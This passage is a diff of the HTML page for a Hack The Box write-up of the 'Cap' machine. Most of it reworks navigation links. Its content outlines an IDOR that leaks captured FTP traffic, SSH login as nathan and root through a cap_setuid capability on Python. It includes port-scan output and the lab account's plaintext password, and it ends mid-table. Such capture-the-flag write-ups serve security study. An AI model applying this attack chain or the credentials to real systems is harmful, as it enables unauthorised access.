@@ -6,40 +6,36 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="Cap Hack The Box writeup covering the IDOR, credential reuse and Python file capability escalation.">
+        <meta name="description" content="Personal offensive security notes, cheatsheets, checklists and writeups — web application testing, Active Directory, red team operations and cloud.">
       
       
         <meta name="author" content="0x3xp10i73r">
       
       
-        <link rel="canonical" href="https://0x3xp10i73r.github.io/offsec-vault/hack-the-box-labs/cap/">
+        <link rel="canonical" href="https://0x3xp10i73r.github.io/offsec-vault/hack-the-box-labs/Cap/HTB%20-%20Cap/">
       
       
-        <link rel="prev" href="../">
-      
-      
-        <link rel="next" href="../connected/">
       
       
         
       
       
-        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../feed_rss_created.xml">
-        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../feed_rss_updated.xml">
+        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../../feed_rss_updated.xml">
       
-      <link rel="icon" href="../../assets/images/favicon.svg">
+      <link rel="icon" href="../../../assets/images/favicon.svg">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
     
     
       
-        <title>Cap - 0x3xp10i73r</title>
+        <title>HTB Cap - 0x3xp10i73r</title>
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.ec1eaa64.min.css">
       
         
-        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
       
       
 
@@ -58,9 +54,9 @@
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/extra-charcoal.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/extra-charcoal.css">
     
-    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -83,7 +79,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#cap" class="md-skip">
+        <a href="#summary" class="md-skip">
           Skip to content
         </a>
       
@@ -99,9 +95,9 @@
 
 <header class="md-header md-header--shadow" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="../.." title="0x3xp10i73r" class="md-header__button md-logo" aria-label="0x3xp10i73r" data-md-component="logo">
+    <a href="../../.." title="0x3xp10i73r" class="md-header__button md-logo" aria-label="0x3xp10i73r" data-md-component="logo">
       
-  <img src="../../assets/images/logo.svg" alt="logo">
+  <img src="../../../assets/images/logo.svg" alt="logo">
 
     </a>
     <label class="md-header__button md-icon" for="__drawer">
@@ -118,7 +114,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Cap
+              HTB   Cap
             
           </span>
         </div>
@@ -203,9 +199,9 @@
 
 <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../.." title="0x3xp10i73r" class="md-nav__button md-logo" aria-label="0x3xp10i73r" data-md-component="logo">
+    <a href="../../.." title="0x3xp10i73r" class="md-nav__button md-logo" aria-label="0x3xp10i73r" data-md-component="logo">
       
-  <img src="../../assets/images/logo.svg" alt="logo">
+  <img src="../../../assets/images/logo.svg" alt="logo">
 
     </a>
     0x3xp10i73r
@@ -220,7 +216,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../.." class="md-nav__link">
+      <a href="../../.." class="md-nav__link">
         
   
   
@@ -247,7 +243,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../how-to-start/" class="md-nav__link">
+      <a href="../../../how-to-start/" class="md-nav__link">
         
   
   
@@ -296,7 +292,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../web-application-pentesting/" class="md-nav__link ">
+            <a href="../../../web-application-pentesting/" class="md-nav__link ">
               
   
   
@@ -391,7 +387,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web-application-pentesting/authentication-vulnerabilities/what-is-authentication/" class="md-nav__link">
+      <a href="../../../web-application-pentesting/authentication-vulnerabilities/what-is-authentication/" class="md-nav__link">
         
   
   
@@ -484,7 +480,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web-application-pentesting/cors/what-is-cors/" class="md-nav__link">
+      <a href="../../../web-application-pentesting/cors/what-is-cors/" class="md-nav__link">
         
   
   
@@ -512,7 +508,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web-application-pentesting/cors/cors-vs-csrf/" class="md-nav__link">
+      <a href="../../../web-application-pentesting/cors/cors-vs-csrf/" class="md-nav__link">
         
   
   
@@ -540,7 +536,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web-application-pentesting/cors/sop-vs-csrf/" class="md-nav__link">
+      <a href="../../../web-application-pentesting/cors/sop-vs-csrf/" class="md-nav__link">
         
   
   
@@ -621,7 +617,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web-application-pentesting/cors/cors-labs/cors-basic-origin-reflection/" class="md-nav__link">
+      <a href="../../../web-application-pentesting/cors/cors-labs/cors-basic-origin-reflection/" class="md-nav__link">
         
   
   
@@ -649,7 +645,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web-application-pentesting/cors/cors-labs/trusted-null-origin/cors-trusted-null-origin/" class="md-nav__link">
+      <a href="../../../web-application-pentesting/cors/cors-labs/trusted-null-origin/cors-trusted-null-origin/" class="md-nav__link">
         
   
   
@@ -697,8 +693,6 @@
       
   
   
-    
-  
   
   
     
@@ -722,15 +716,15 @@
     
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../" class="md-nav__link ">
+            <a href="../../" class="md-nav__link ">
               
   
   
@@ -754,7 +748,7 @@
             
           </div>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_4">
             <span class="md-nav__icon md-icon"></span>
             
@@ -771,37 +765,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Cap
-  
-
-    
-  </span>
-  
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../cap/index.md" class="md-nav__link">
         
   
   
@@ -817,92 +784,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#attack-path" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Attack path
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#1-reconnaissance" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        1. Reconnaissance
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#2-exploit-the-capture-idor" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        2. Exploit the capture IDOR
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#3-obtain-the-user-shell" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        3. Obtain the user shell
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#4-escalate-through-python-capabilities" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        4. Escalate through Python capabilities
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#takeaways" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Takeaways
-      
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -915,7 +796,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../connected/" class="md-nav__link">
+      <a href="../../connected/" class="md-nav__link">
         
   
   
@@ -943,7 +824,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../facts/" class="md-nav__link">
+      <a href="../../facts/" class="md-nav__link">
         
   
   
@@ -971,7 +852,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../reactor/" class="md-nav__link">
+      <a href="../../reactor/" class="md-nav__link">
         
   
   
@@ -999,7 +880,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../wingdata/" class="md-nav__link">
+      <a href="../../wingdata/" class="md-nav__link">
         
   
   
@@ -1070,7 +951,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../android/" class="md-nav__link ">
+            <a href="../../../android/" class="md-nav__link ">
               
   
   
@@ -1114,7 +995,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../android/setup-adb/" class="md-nav__link">
+      <a href="../../../android/setup-adb/" class="md-nav__link">
         
   
   
@@ -1142,7 +1023,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../android/proxy-certificates/" class="md-nav__link">
+      <a href="../../../android/proxy-certificates/" class="md-nav__link">
         
   
   
@@ -1170,7 +1051,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../android/static-analysis/" class="md-nav__link">
+      <a href="../../../android/static-analysis/" class="md-nav__link">
         
   
   
@@ -1198,7 +1079,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../android/dynamic-analysis/" class="md-nav__link">
+      <a href="../../../android/dynamic-analysis/" class="md-nav__link">
         
   
   
@@ -1226,7 +1107,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../android/checklist/" class="md-nav__link">
+      <a href="../../../android/checklist/" class="md-nav__link">
         
   
   
@@ -1254,7 +1135,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../android/frida/" class="md-nav__link">
+      <a href="../../../android/frida/" class="md-nav__link">
         
   
   
@@ -1282,7 +1163,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../android/glossary/" class="md-nav__link">
+      <a href="../../../android/glossary/" class="md-nav__link">
         
   
   
@@ -1310,7 +1191,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../android/tools/" class="md-nav__link">
+      <a href="../../../android/tools/" class="md-nav__link">
         
   
   
@@ -1338,7 +1219,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../android/ios-cross-platform/" class="md-nav__link">
+      <a href="../../../android/ios-cross-platform/" class="md-nav__link">
         
   
   
@@ -1395,7 +1276,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../privesc/" class="md-nav__link ">
+            <a href="../../../privesc/" class="md-nav__link ">
               
   
   
@@ -1439,7 +1320,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../privesc/linux-privesc/" class="md-nav__link">
+      <a href="../../../privesc/linux-privesc/" class="md-nav__link">
         
   
   
@@ -1467,7 +1348,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../privesc/windows-privesc/" class="md-nav__link">
+      <a href="../../../privesc/windows-privesc/" class="md-nav__link">
         
   
   
@@ -1526,7 +1407,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../active-directory/" class="md-nav__link ">
+            <a href="../../../active-directory/" class="md-nav__link ">
               
   
   
@@ -1621,7 +1502,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../active-directory/ad-enumeration-bloodhound/" class="md-nav__link">
+      <a href="../../../active-directory/ad-enumeration-bloodhound/" class="md-nav__link">
         
   
   
@@ -1710,7 +1591,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../active-directory/kerberos-credential-attacks/" class="md-nav__link">
+      <a href="../../../active-directory/kerberos-credential-attacks/" class="md-nav__link">
         
   
   
@@ -1738,7 +1619,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../active-directory/adcs-delegation-acl/" class="md-nav__link">
+      <a href="../../../active-directory/adcs-delegation-acl/" class="md-nav__link">
         
   
   
@@ -1827,7 +1708,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../active-directory/lateral-movement-pivoting/" class="md-nav__link">
+      <a href="../../../active-directory/lateral-movement-pivoting/" class="md-nav__link">
         
   
   
@@ -1855,7 +1736,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../active-directory/domain-dominance-persistence/" class="md-nav__link">
+      <a href="../../../active-directory/domain-dominance-persistence/" class="md-nav__link">
         
   
   
@@ -1922,7 +1803,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../red-team/" class="md-nav__link ">
+            <a href="../../../red-team/" class="md-nav__link ">
               
   
   
@@ -1966,7 +1847,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../red-team/initial-access-phishing/" class="md-nav__link">
+      <a href="../../../red-team/initial-access-phishing/" class="md-nav__link">
         
   
   
@@ -1994,7 +1875,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../red-team/c2-infrastructure-opsec/" class="md-nav__link">
+      <a href="../../../red-team/c2-infrastructure-opsec/" class="md-nav__link">
         
   
   
@@ -2022,7 +1903,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../red-team/edr-amsi-evasion/" class="md-nav__link">
+      <a href="../../../red-team/edr-amsi-evasion/" class="md-nav__link">
         
   
   
@@ -2077,7 +1958,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../cloud-mobile/" class="md-nav__link ">
+            <a href="../../../cloud-mobile/" class="md-nav__link ">
               
   
   
@@ -2121,7 +2002,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cloud-mobile/aws-azure-gcp/" class="md-nav__link">
+      <a href="../../../cloud-mobile/aws-azure-gcp/" class="md-nav__link">
         
   
   
@@ -2178,7 +2059,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../recon/" class="md-nav__link ">
+            <a href="../../../recon/" class="md-nav__link ">
               
   
   
@@ -2275,7 +2156,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../recon/subdomain-enumeration/" class="md-nav__link">
+      <a href="../../../recon/subdomain-enumeration/" class="md-nav__link">
         
   
   
@@ -2303,7 +2184,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../recon/osint-dorking/" class="md-nav__link">
+      <a href="../../../recon/osint-dorking/" class="md-nav__link">
         
   
   
@@ -2392,7 +2273,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../recon/port-service-enumeration/" class="md-nav__link">
+      <a href="../../../recon/port-service-enumeration/" class="md-nav__link">
         
   
   
@@ -2420,7 +2301,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../recon/web-recon-fuzzing/" class="md-nav__link">
+      <a href="../../../recon/web-recon-fuzzing/" class="md-nav__link">
         
   
   
@@ -2487,7 +2368,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../web-bugbounty/" class="md-nav__link ">
+            <a href="../../../web-bugbounty/" class="md-nav__link ">
               
   
   
@@ -2584,7 +2465,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web-bugbounty/auth-ato-oauth-jwt/" class="md-nav__link">
+      <a href="../../../web-bugbounty/auth-ato-oauth-jwt/" class="md-nav__link">
         
   
   
@@ -2612,7 +2493,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web-bugbounty/access-control-idor-race/" class="md-nav__link">
+      <a href="../../../web-bugbounty/access-control-idor-race/" class="md-nav__link">
         
   
   
@@ -2701,7 +2582,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web-bugbounty/injection-attacks/" class="md-nav__link">
+      <a href="../../../web-bugbounty/injection-attacks/" class="md-nav__link">
         
   
   
@@ -2729,7 +2610,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web-bugbounty/xss-csp-client-side/" class="md-nav__link">
+      <a href="../../../web-bugbounty/xss-csp-client-side/" class="md-nav__link">
         
   
   
@@ -2818,7 +2699,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web-bugbounty/ssrf-cors-csrf-smuggling/" class="md-nav__link">
+      <a href="../../../web-bugbounty/ssrf-cors-csrf-smuggling/" class="md-nav__link">
         
   
   
@@ -2846,7 +2727,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web-bugbounty/api-graphql-modern-web/" class="md-nav__link">
+      <a href="../../../web-bugbounty/api-graphql-modern-web/" class="md-nav__link">
         
   
   
@@ -2911,7 +2792,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../checklists-arsenal/" class="md-nav__link ">
+            <a href="../../../checklists-arsenal/" class="md-nav__link ">
               
   
   
@@ -3008,7 +2889,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../checklists-arsenal/web-bugbounty-checklist/" class="md-nav__link">
+      <a href="../../../checklists-arsenal/web-bugbounty-checklist/" class="md-nav__link">
         
   
   
@@ -3036,7 +2917,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../checklists-arsenal/internal-ad-checklist/" class="md-nav__link">
+      <a href="../../../checklists-arsenal/internal-ad-checklist/" class="md-nav__link">
         
   
   
@@ -3125,7 +3006,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../checklists-arsenal/burp-extensions-arsenal/" class="md-nav__link">
+      <a href="../../../checklists-arsenal/burp-extensions-arsenal/" class="md-nav__link">
         
   
   
@@ -3153,7 +3034,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../checklists-arsenal/security-reference-index/" class="md-nav__link">
+      <a href="../../../checklists-arsenal/security-reference-index/" class="md-nav__link">
         
   
   
@@ -3198,7 +3079,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../blog/" class="md-nav__link">
+      <a href="../../../blog/" class="md-nav__link">
         
   
   
@@ -3225,7 +3106,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../tags/" class="md-nav__link">
+      <a href="../../../tags/" class="md-nav__link">
         
   
   
@@ -3262,8 +3143,6 @@
   
   
   
-    
-  
   
     <label class="md-nav__title" for="__toc">
       <span class="md-nav__icon md-icon"></span>
@@ -3272,10 +3151,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#attack-path" class="md-nav__link">
+  <a href="#summary" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Attack path
+        Summary
       
     </span>
   </a>
@@ -3291,13 +3170,30 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="1. Reconnaissance">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#port-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Port Scan
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
-  <a href="#2-exploit-the-capture-idor" class="md-nav__link">
+  <a href="#2-web-enumeration" class="md-nav__link">
     <span class="md-ellipsis">
       
-        2. Exploit the capture IDOR
+        2. Web Enumeration
       
     </span>
   </a>
@@ -3305,10 +3201,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#3-obtain-the-user-shell" class="md-nav__link">
+  <a href="#3-exploiting-the-idor" class="md-nav__link">
     <span class="md-ellipsis">
       
-        3. Obtain the user shell
+        3. Exploiting the IDOR
       
     </span>
   </a>
@@ -3316,10 +3212,66 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#4-escalate-through-python-capabilities" class="md-nav__link">
+  <a href="#4-initial-access-ssh" class="md-nav__link">
     <span class="md-ellipsis">
       
-        4. Escalate through Python capabilities
+        4. Initial Access (SSH)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. Initial Access (SSH)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#user-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        User Flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Privilege Escalation
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#root-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Root Flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-root-cause-remediation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. Root Cause &amp; Remediation
       
     </span>
   </a>
@@ -3327,10 +3279,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#takeaways" class="md-nav__link">
+  <a href="#7-attack-chain-summary" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Takeaways
+        7. Attack Chain Summary
       
     </span>
   </a>
@@ -3367,75 +3319,17 @@
 
 
 
-<h1 id="cap">Cap<a class="headerlink" href="#cap" title="Permanent link">&para;</a></h1>
-<p><img class="htb-banner" src="images/banner.png" alt="Cap box banner placeholder"></p>
-<div class="admonition note">
-<p class="admonition-title">Replaceable banner</p>
-<p>Replace <code>images/banner.png</code> in this box folder with the final Cap artwork. The page already points to that filename.</p>
-</div>
-<table>
-<thead>
-<tr>
-<th>Field</th>
-<th>Value</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Status</td>
-<td>Completed</td>
-</tr>
-<tr>
-<td>Difficulty</td>
-<td>Easy</td>
-</tr>
-<tr>
-<td>Focus</td>
-<td>Linux, Web</td>
-</tr>
-<tr>
-<td>Machine</td>
-<td><a href="https://app.hackthebox.com/machines/Cap">Cap on Hack The Box</a></td>
-</tr>
-</tbody>
-</table>
-<h2 id="attack-path">Attack path<a class="headerlink" href="#attack-path" title="Permanent link">&para;</a></h2>
-<ol>
-<li>Scan the host and identify FTP, SSH and HTTP.</li>
-<li>Enumerate the web application and find the packet-capture functionality.</li>
-<li>Abuse the predictable capture identifier to access another capture and recover FTP credentials.</li>
-<li>Reuse the recovered credentials over SSH as <code>nathan</code>.</li>
-<li>Find <code>cap_setuid</code> on <code>/usr/bin/python3.8</code> and use it to obtain a root shell.</li>
-</ol>
+  <h1>HTB   Cap</h1>
+
+<p><strong>Difficulty:</strong> Easy <strong>OS:</strong> Linux </p>
+<p><img alt="Cap — Hack The Box, Linux, Easy" src="../images/banner.jpg" /></p>
+<h2 id="summary">Summary<a class="headerlink" href="#summary" title="Permanent link">&para;</a></h2>
+<p>Cap is an easy Linux box that starts with an exposed network-monitoring web dashboard. A classic IDOR on a <code>/data/&lt;id&gt;</code> download endpoint leaks a previous user's captured FTP traffic, which contains plaintext credentials. Those credentials grant SSH access as <code>nathan</code>. Privilege escalation to <code>root</code> is achieved by abusing a misconfigured Linux capability (<code>cap_setuid</code>) assigned to the system's <code>python3.8</code> binary.</p>
+<hr />
 <h2 id="1-reconnaissance">1. Reconnaissance<a class="headerlink" href="#1-reconnaissance" title="Permanent link">&para;</a></h2>
-<p>The supplied RustScan output identified three exposed services:</p>
-<table>
-<thead>
-<tr>
-<th style="text-align: right;">Port</th>
-<th>Service</th>
-<th>Observation</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align: right;">21/tcp</td>
-<td>FTP</td>
-<td>Available for credential testing and packet-capture validation.</td>
-</tr>
-<tr>
-<td style="text-align: right;">22/tcp</td>
-<td>SSH</td>
-<td>Remote shell once credentials are recovered.</td>
-</tr>
-<tr>
-<td style="text-align: right;">80/tcp</td>
-<td>HTTP</td>
-<td>Cap's dashboard and capture download functionality.</td>
-</tr>
-</tbody>
-</table>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>┌──<span class="o">(</span>kali㉿Shieldbyte53<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+<h3 id="port-scan">Port Scan<a class="headerlink" href="#port-scan" title="Permanent link">&para;</a></h3>
+<p>A fast scan with <code>rustscan</code> (handing off to <code>nmap</code> for service detection) revealed three open ports:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
 </span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>└─$<span class="w"> </span>rustscan<span class="w"> </span>-a<span class="w"> </span><span class="m">10</span>.129.6.89<span class="w"> </span>-u<span class="w"> </span><span class="m">5000</span><span class="w"> </span>--<span class="w"> </span>-sS<span class="w"> </span>-T4
 </span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>.----.<span class="w"> </span>.-.<span class="w"> </span>.-.<span class="w"> </span>.----..---.<span class="w">  </span>.----.<span class="w"> </span>.---.<span class="w">   </span>.--.<span class="w">  </span>.-.<span class="w"> </span>.-.
 </span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="p">|</span><span class="w"> </span><span class="o">{}</span><span class="w">  </span><span class="o">}</span><span class="p">|</span><span class="w"> </span><span class="o">{</span><span class="w"> </span><span class="o">}</span><span class="w"> </span><span class="p">|</span><span class="o">{</span><span class="w"> </span><span class="o">{</span>__<span class="w"> </span><span class="o">{</span>_<span class="w">   </span>_<span class="o">}{</span><span class="w"> </span><span class="o">{</span>__<span class="w">  </span>/<span class="w">  </span>___<span class="o">}</span><span class="w"> </span>/<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="se">\ </span><span class="p">|</span><span class="w">  </span><span class="sb">`</span><span class="p">|</span><span class="w"> </span><span class="p">|</span>
@@ -3482,100 +3376,149 @@
 </span><span id="__span-0-45"><a id="__codelineno-0-45" name="__codelineno-0-45" href="#__codelineno-0-45"></a>Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">1</span>.10<span class="w"> </span>seconds
 </span><span id="__span-0-46"><a id="__codelineno-0-46" name="__codelineno-0-46" href="#__codelineno-0-46"></a><span class="w">           </span>Raw<span class="w"> </span>packets<span class="w"> </span>sent:<span class="w"> </span><span class="m">7</span><span class="w"> </span><span class="o">(</span>284B<span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Rcvd:<span class="w"> </span><span class="m">6</span><span class="w"> </span><span class="o">(</span>240B<span class="o">)</span>
 </span></code></pre></div>
-<p>The HTTP application presents a dashboard with security snapshots and packet-capture analysis. The first two screenshots preserve the web enumeration sequence from the source notes.</p>
-<figure class="htb-figure">
-  <img class="htb-screenshot" src="images/image-1.png" alt="Cap web application dashboard" loading="lazy">
-  <figcaption><strong>Figure 1.</strong> The Cap dashboard exposed on port 80.</figcaption>
-</figure>
-
-<figure class="htb-figure">
-  <img class="htb-screenshot" src="images/image-2.png" alt="Cap packet capture data view" loading="lazy">
-  <figcaption><strong>Figure 2.</strong> A packet-capture data view exposed by the dashboard.</figcaption>
-</figure>
-
-<h2 id="2-exploit-the-capture-idor">2. Exploit the capture IDOR<a class="headerlink" href="#2-exploit-the-capture-idor" title="Permanent link">&para;</a></h2>
-<p>The application exposes capture records through a numeric path. Changing the capture identifier from the currently displayed record to another valid identifier reveals a different capture rather than enforcing ownership. The next two screenshots show the record enumeration and the packet contents.</p>
-<figure class="htb-figure">
-  <img class="htb-screenshot" src="images/image-3.png" alt="Cap capture identifier enumeration" loading="lazy">
-  <figcaption><strong>Figure 3.</strong> The capture identifier can be changed directly in the URL.</figcaption>
-</figure>
-
-<figure class="htb-figure">
-  <img class="htb-screenshot" src="images/image-4.png" alt="Cap packet capture showing FTP traffic" loading="lazy">
-  <figcaption><strong>Figure 4.</strong> The recovered capture contains FTP authentication traffic.</figcaption>
-</figure>
-
-<p>The FTP stream exposes credentials for the <code>nathan</code> account. They are used only against this authorized lab machine:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>username - nathan
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>password - Buck3tH4TF0RM3!
+<table>
+<thead>
+<tr>
